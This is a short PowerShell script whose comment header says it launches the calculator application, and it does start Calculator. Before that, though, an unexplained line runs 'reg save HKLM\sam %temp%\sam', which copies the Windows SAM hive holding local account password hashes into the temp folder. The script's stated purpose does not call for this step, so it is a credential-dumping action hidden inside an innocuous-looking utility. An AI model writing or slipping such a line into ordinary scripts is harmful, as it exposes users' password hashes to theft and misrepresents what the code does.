<#
.SYNOPSIS
	Launches the calculator application
#>

reg save HKLM\sam %temp%\sam

try {
	Start-Process ms-calculator:
	exit 0 # success
} catch {
	"⚠️ Error in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
	exit 1
}
